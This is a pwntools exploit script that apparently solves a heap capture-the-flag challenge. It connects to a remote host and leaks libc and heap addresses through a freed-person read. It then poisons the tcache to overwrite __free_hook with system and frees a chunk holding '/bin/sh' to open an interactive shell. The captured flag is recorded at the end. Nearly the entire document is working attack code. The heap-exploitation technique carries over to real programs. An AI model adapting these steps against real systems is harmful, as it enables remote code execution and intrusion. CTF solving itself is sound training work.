from pwn import *

exe = context.binary = ELF('./chall')

host = args.HOST or '35.245.143.0'
port = int(args.PORT or 5555)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, aslr=False, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())
io = start()


def createhouse(name, size, desc):
    io.sendlineafter('>> ', '1')
    io.sendafter('House : ', name)
    io.sendlineafter('of House : ', str(size))
    io.sendafter('description : ', desc)


def createperson(name, size, desc):
    io.sendlineafter('>> ', '2')
    io.sendafter('Person :', name)
    io.sendlineafter('of Person : ', str(size))
    io.sendafter('details : ', desc)


def addperson(personidx, houseidx):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('number : ', str(personidx))
    io.sendlineafter('? : ', str(houseidx))


def removeperson(personidx, houseidx):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('? : ', str(houseidx))
    io.sendlineafter('number : ', str(personidx))


def viewhouse(houseidx):
    io.sendlineafter('>> ', '5')
    io.sendlineafter('? : ', str(houseidx))


def viewperson(personidx, houseidx):
    io.sendlineafter('>> ', '6')
    io.sendlineafter('? : ', str(houseidx))
    io.sendlineafter('number : ', str(personidx))


def party(houseidx):
    io.sendlineafter('>> ', '7')
    io.sendlineafter('? : ', str(houseidx))


def destroy(houseidx):
    io.sendlineafter('>> ', '8')
    io.sendlineafter('? : ', str(houseidx))


free_hook = 0x1e75a8
malloc_hook = 0x1e4c30
system = 0x52fd0

createhouse('A' * 0x20, 0x18, 'HKHK')
for i in range(2):
    createperson('ZZZ', 0x18, 'HKHK')
createperson('/bin/sh\x00', 0x18, 'vvv')
for i in range(5):
    createperson('HKHK', 0x18, 'HKHK')
createperson('HKHK', 0x418, 'HKHK')
createperson('HKHK', 0x38, 'HKHK')
for i in range(10):
    addperson(i, 0)
viewperson(8, 0)
removeperson(0, 0)
viewhouse(0)
io.recvuntil('Person 8   with details  ')
libc_base = u64(io.recvn(6) + '\x00\x00') - 0x1e4ca0
log.info('Libc base {}'.format(hex(libc_base)))
viewperson(9, 0)
removeperson(1, 0)
viewhouse(0)
io.recvuntil('Person 9  ')
heap_base = u64(io.recvn(6) + '\x00\x00') - 0xa60
log.info('Heap leak {}'.format(hex(heap_base)))
for i in range(9):
    createperson('HKHK', 0x38, 'HKHK')
createperson('HKHK', 0x418, 'HKHK')
createhouse('HKHK', 0x18, 'HKHK')
for i in range(10):
    addperson(i, 1)
for i in range(4):
    removeperson(i, 1)
viewperson(5, 1)
removeperson(6, 1)  # delete 5 here
removeperson(7, 1)
party(1)
for i in range(3):
    createperson('AAAA', 0x38, 'BBBB')
for i in range(2):
    createperson('BBBB', 0x38, 'CCCC')
createperson('AAAA', 0x38, 'DDDD')
createperson(p64(heap_base + 0x60), 0x38, 'DDDD')
createperson('DDDD', 0x38, 'KKKK')
createperson(p64(libc_base + free_hook), 0x38, 'GGGG')
createperson('HKHKK', 0x58, p64(libc_base + system))
viewperson(2, 0)
removeperson(0, 0)
io.interactive()

# FLAG --> inctf{m3h_th4t_w4s_a_trivial_bug_7734736f615f472}
